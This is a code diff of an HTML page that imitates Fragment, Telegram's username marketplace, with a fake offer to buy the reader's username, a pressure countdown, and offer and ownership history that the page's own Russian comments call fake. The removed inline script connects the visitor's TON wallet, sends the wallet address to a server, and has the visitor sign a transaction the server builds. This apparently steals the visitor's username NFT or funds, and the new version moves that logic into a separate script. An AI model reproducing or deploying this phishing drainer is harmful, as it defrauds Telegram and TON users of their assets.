@@ -1,368 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta charset="utf-8">
     <title>Fragment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
-    <style>
-        :root {
-            --bg-color: #0b121c;
-            --card-bg: #172130;
-            --border-color: #232f41;
-            --text-main: #ffffff;
-            --text-muted: #7d8c9f;
-            --blue-btn: #0098ea;
-            --green-text: #34c759;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 16px;
-            padding-bottom: 40px;
-        }
-
-        /* Шапка */
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding-bottom: 20px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid var(--border-color);
-        }
-        .header-logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 18px;
-            font-weight: 800;
-            letter-spacing: 0.5px;
-        }
-        
-        /* Заголовок с юзернеймом */
-        .username-title {
-            text-align: center;
-            font-size: 28px;
-            font-weight: 700;
-            margin: 20px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-        .status-badge {
-            font-size: 12px;
-            background: rgba(52, 199, 89, 0.15);
-            color: var(--green-text);
-            padding: 4px 10px;
-            border-radius: 6px;
-            font-weight: 600;
-        }
-
-        /* Карточки */
-        .card {
-            background-color: var(--card-bg);
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 16px;
-        }
-
-        .offer-desc {
-            font-size: 14px;
-            color: var(--text-muted);
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        .offer-desc b {
-            color: var(--text-main);
-        }
-        .offer-desc a {
-            color: var(--blue-btn);
-            text-decoration: none;
-        }
-
-        /* Таблица данных */
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 16px 0;
-            border-bottom: 1px solid var(--border-color);
-            font-size: 14px;
-        }
-        .info-row:last-child {
-            border-bottom: none;
-            padding-bottom: 0;
-        }
-        .info-label {
-            font-weight: 600;
-        }
-        .info-value {
-            color: var(--blue-btn);
-            text-align: right;
-        }
-
-        /* Таймер */
-        .timer-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin: 30px 0;
-            color: var(--text-muted);
-            font-size: 14px;
-        }
-        .timer-block {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .timer-box {
-            background-color: var(--card-bg);
-            color: var(--text-main);
-            padding: 8px 12px;
-            border-radius: 8px;
-            font-weight: 700;
-            font-size: 16px;
-            min-width: 24px;
-            text-align: center;
-        }
-        .timer-sep {
-            font-weight: 700;
-            font-size: 16px;
-            color: var(--text-muted);
-        }
-
-        /* Кнопка */
-        .accept-btn {
-            background-color: var(--blue-btn);
-            color: white;
-            border: none;
-            padding: 18px;
-            width: 100%;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
-        .accept-btn:disabled {
-            background-color: #2a3548;
-            color: #7d8c9f;
-            cursor: not-allowed;
-        }
-
-        /* История и другие офферы (заглушки для красоты) */
-        .section-title {
-            font-size: 20px;
-            font-weight: 700;
-            margin: 30px 0 16px 0;
-        }
-        .table-header {
-            display: flex;
-            font-size: 13px;
-            color: var(--text-muted);
-            padding: 0 16px 10px 16px;
-        }
-        .table-row {
-            display: flex;
-            background: var(--card-bg);
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
-        .col-1 { flex: 1; }
-        .col-2 { flex: 1; text-align: center; color: var(--text-muted);}
-        .col-3 { flex: 1; text-align: right; color: var(--blue-btn);}
-    </style>
+    <!-- Подключаем стили -->
+    <link rel="stylesheet" href="/style.css">
 </head>
 <body>
 
     <!-- Шапка -->
-    <div class="header">
-        <div class="header-logo">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M2.5 5.5L12 12L2.5 18.5V5.5Z"/></svg>
+    <header class="tm-header">
+        <div class="tm-logo-text">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2.5 5.5L12 12L2.5 18.5V5.5Z"/></svg>
             FRAGMENT
         </div>
-    </div>
+    </header>
 
-    <!-- Заголовок -->
-    <div class="username-title">
-        <span id="display-username">loading.t.me</span>
-        <span class="status-badge">Claimed</span>
-    </div>
-
-    <!-- Основная карточка -->
-    <div class="card">
-        <div class="offer-desc">
-            <b>What is this?</b><br><br>
-            Someone offered 💎 <b><span id="display-price">0</span></b> for your username. If the price suits you, press "Accept the offer".
-            <br><br>
-            <a href="#">How does this work?</a>
+    <main class="tm-main">
+        <!-- Заголовок -->
+        <div class="tm-section-header">
+            <span class="tm-section-header-domain">
+                <span id="display-username">loading</span>.t.me
+            </span>
+            <span class="tm-section-header-status">Claimed</span>
         </div>
 
-        <div class="info-row">
-            <span class="info-label">Telegram Username</span>
-            <span class="info-value">@<span id="info-username">loading</span></span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">Web Address</span>
-            <span class="info-value">t.me/<span id="info-web">loading</span></span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">TON Web 3.0 Address</span>
-            <span class="info-value"><span id="info-ton">loading</span>.t.me</span>
-        </div>
-    </div>
+        <!-- Блок с офером -->
+        <div class="tm-section-box">
+            <div class="tm-bid-info-text" style="margin-bottom: 24px;">
+                <b>What is this?</b><br><br>
+                Someone offered <b><span id="display-price" class="icon-ton">0</span></b> for your username. If the price suits you, press "Accept the offer".<br><br>
+                <a href="#">How does this work?</a>
+            </div>
 
-    <!-- Таймер -->
-    <div class="timer-container">
-        <span>Ends in</span>
-        <div class="timer-block">
-            <div class="timer-box" id="t-days">6</div> <span>days</span>
-            <span class="timer-sep">:</span>
-            <div class="timer-box" id="t-hours">02</div>
-            <span class="timer-sep">:</span>
-            <div class="timer-box" id="t-mins">55</div>
-            <span class="timer-sep">:</span>
-            <div class="timer-box" id="t-secs">48</div>
+            <div class="tm-table">
+                <table style="width: 100%;">
+                    <tr>
+                        <td style="padding-top: 0;">Telegram Username</td>
+                        <td style="padding-top: 0;" class="accent-color">@<span id="info-username">loading</span></td>
+                    </tr>
+                    <tr>
+                        <td>Web Address</td>
+                        <td class="accent-color">t.me/<span id="info-web">loading</span></td>
+                    </tr>
+                    <tr>
+                        <td style="padding-bottom: 0;">TON Web 3.0 Address</td>
+                        <td style="padding-bottom: 0;" class="accent-color"><span id="info-ton">loading</span>.t.me</td>
+                    </tr>
+                </table>
+            </div>
         </div>
-    </div>
 
-    <!-- Кнопка -->
-    <button id="accept-btn" class="accept-btn" disabled>Loading...</button>
-    
-    <!-- Скрытый коннектор TonConnect -->
+        <!-- Таймер -->
+        <div class="tm-section-box">
+            <div class="tm-section-countdown">
+                <span>Ends in</span>
+                <time class="tm-countdown-timer">
+                    <span class="reel" id="t-days">0 days</span> :
+                    <span class="reel" id="t-hours">00</span> :
+                    <span class="reel" id="t-mins">00</span> :
+                    <span class="reel" id="t-secs">00</span>
+                </time>
+            </div>
+        </div>
+
+        <!-- Кнопка -->
+        <button id="accept-btn" class="btn-primary" disabled>Loading...</button>
+
+        <!-- Фейковая История для солидности -->
+        <h3 class="tm-section-title">Latest Offers</h3>
+        <div class="tm-section-box">
+            <table class="tm-table">
+                <thead>
+                    <tr>
+                        <th style="width: 30%;">Offer</th>
+                        <th style="width: 40%;">Date</th>
+                        <th style="width: 30%; text-align: right;">Offered by</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="icon-ton"><b id="latest-price">0</b></td>
+                        <td style="color: #8b95a5; font-weight: 400;">Today at <span id="latest-time">00:00</span></td>
+                        <td class="accent-color">UQDm89iC...vEnlMO6e</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3 class="tm-section-title">Ownership History</h3>
+        <div class="tm-section-box">
+            <table class="tm-table">
+                <thead>
+                    <tr>
+                        <th style="width: 30%;">Sale price</th>
+                        <th style="width: 40%;">Date</th>
+                        <th style="width: 30%; text-align: right;">Buyer</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="icon-ton"><b>10</b></td>
+                        <td style="color: #8b95a5; font-weight: 400;">Nov 21 at 21:39</td>
+                        <td class="accent-color">UQCXv...HWJ_4</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+    </main>
+
     <div id="ton-connect" style="display: none;"></div>
 
-    <!-- Фейковые блоки для солидности -->
-    <div class="section-title">Latest Offers</div>
-    <div class="table-header">
-        <div class="col-1">Offer</div>
-        <div class="col-2">Date</div>
-        <div class="col-3">Offered by</div>
-    </div>
-    <div class="table-row">
-        <div class="col-1">💎 <b id="latest-price">0</b></div>
-        <div class="col-2">Today at <span id="latest-time">00:00</span></div>
-        <div class="col-3">UQDm89iC...vEnlMO6e</div>
-    </div>
-
-    <div class="section-title">Ownership History</div>
-    <div class="table-header">
-        <div class="col-1">Sale price</div>
-        <div class="col-2">Date</div>
-        <div class="col-3">Buyer</div>
-    </div>
-    <div class="table-row">
-        <div class="col-1">💎 <b>10</b></div>
-        <div class="col-2">Nov 21 at 21:39</div>
-        <div class="col-3">UQCXv...HWJ_4</div>
-    </div>
-
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const offerId = urlParams.get('offer_id');
-        
-        if (!offerId) {
-            document.getElementById('accept-btn').innerText = "Invalid link";
-            throw new Error("No offer ID");
-        }
-
-        // Загрузка данных оффера
-        fetch(`/api/offer/${offerId}`)
-            .then(r => r.json())
-            .then(data => {
-                if (data.error) throw new Error(data.error);
-                
-                // Подставляем данные во все места
-                document.getElementById('display-username').innerText = `${data.username}.t.me`;
-                document.getElementById('display-price').innerText = data.price;
-                document.getElementById('info-username').innerText = data.username;
-                document.getElementById('info-web').innerText = data.username;
-                document.getElementById('info-ton').innerText = data.username;
-                document.getElementById('latest-price').innerText = data.price;
-                
-                // Время текущего оффера
-                const now = new Date();
-                document.getElementById('latest-time').innerText = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
-
-                const btn = document.getElementById('accept-btn');
-                btn.innerText = "Accept the offer";
-                btn.disabled = false;
-            })
-            .catch(e => {
-                document.getElementById('accept-btn').innerText = "Offer not found";
-            });
-
-        // Таймер
-        let endTime = Date.now() + 6 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000 + 55 * 60 * 1000 + 48 * 1000;
-        setInterval(() => {
-            let diff = endTime - Date.now();
-            if (diff < 0) diff = 0;
-            document.getElementById('t-days').innerText = Math.floor(diff / (1000 * 60 * 60 * 24));
-            document.getElementById('t-hours').innerText = Math.floor((diff / (1000 * 60 * 60)) % 24).toString().padStart(2, '0');
-            document.getElementById('t-mins').innerText = Math.floor((diff / 1000 / 60) % 60).toString().padStart(2, '0');
-            document.getElementById('t-secs').innerText = Math.floor((diff / 1000) % 60).toString().padStart(2, '0');
-        }, 1000);
-
-        // TonConnect
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: window.location.origin + '/tonconnect-manifest.json'
-        });
-
-        document.getElementById('accept-btn').addEventListener('click', async () => {
-            if (!tonConnectUI.connected) {
-                await tonConnectUI.openModal();
-                return;
-            }
-
-            const address = tonConnectUI.wallet.account.address;
-            const btn = document.getElementById('accept-btn');
-            btn.innerText = "Checking NFT...";
-            btn.disabled = true;
-
-            try {
-                const res = await fetch('/api/build', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address, offer_id: offerId })
-                });
-                
-                const data = await res.json();
-                
-                if (!res.ok) {
-                    tg.showAlert(data.error || "NFT not found in this wallet");
-                    btn.innerText = "Accept the offer";
-                    btn.disabled = false;
-                    return;
-                }
-
-                await tonConnectUI.sendTransaction(data);
-                
-                await fetch('/api/signed', { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ offer_id: offerId }) 
-                });
-
-                tg.showAlert("Success! Username transferred.");
-                btn.innerText = "Success";
-                
-            } catch (e) {
-                tg.showAlert("Error: " + e.message);
-                btn.innerText = "Accept the offer";
-                btn.disabled = false;
-            }
-        });
-    </script>
+    <!-- Подключаем скрипт -->
+    <script src="/app.js"></script>
 </body>
 </html>
